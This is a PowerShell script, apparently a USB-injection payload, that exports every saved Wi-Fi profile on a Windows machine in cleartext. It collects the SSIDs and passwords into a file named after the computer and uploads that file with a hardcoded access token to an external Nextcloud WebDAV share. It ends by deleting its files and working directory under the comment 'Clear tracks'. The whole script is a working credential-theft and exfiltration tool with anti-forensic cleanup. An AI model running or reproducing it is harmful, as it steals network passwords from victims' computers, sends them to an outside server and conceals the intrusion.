#param (
#[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
#[string]$AccessToken
#)

$AccessToken = "gkj9TSrXtzxGrn4"

function Nextcloud-Upload {

[CmdletBinding()]
param ($SourceFilePath, $AccessToken) 

# Set security protocol to TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Define the File to Upload
$file = $SourceFilePath

# Define authentication information
$nextcloudUrl = "https://wim.nl.tab.digital/"

# Retrieve file object
$fileObject = Get-Item $file

# Define headers for HTTP request
$headers = @{
    "Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($AccessToken):"))))");
    "X-Requested-With"="XMLHttpRequest";
}

# Construct URL for webdav endpoint
$webdavUrl = "$($nextcloudUrl)/public.php/webdav/$($fileObject.Name)"

# Upload file to Nextcloud server
Invoke-RestMethod -Uri $webdavUrl -InFile $fileObject.Fullname -Headers $headers -Method Put 
}


# Create new directory to store wlan network profile dumps
$p = "C:\wipass"
mkdir $p
cd $p

# Get all saved wifi password
netsh wlan export profile key=clear
dir *.xml |% {
$xml=[xml] (get-content $_)
$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Out-File "$env:computername-wificapture.txt" -Append -InputObject $a
}

# Upload to Nextcloud server
Nextcloud-Upload -SourceFilePath "$env:computername-wificapture.txt" -AccessToken $AccessToken

# Clear tracks
rm *.xml
rm *.txt
cd ..
rm wipass



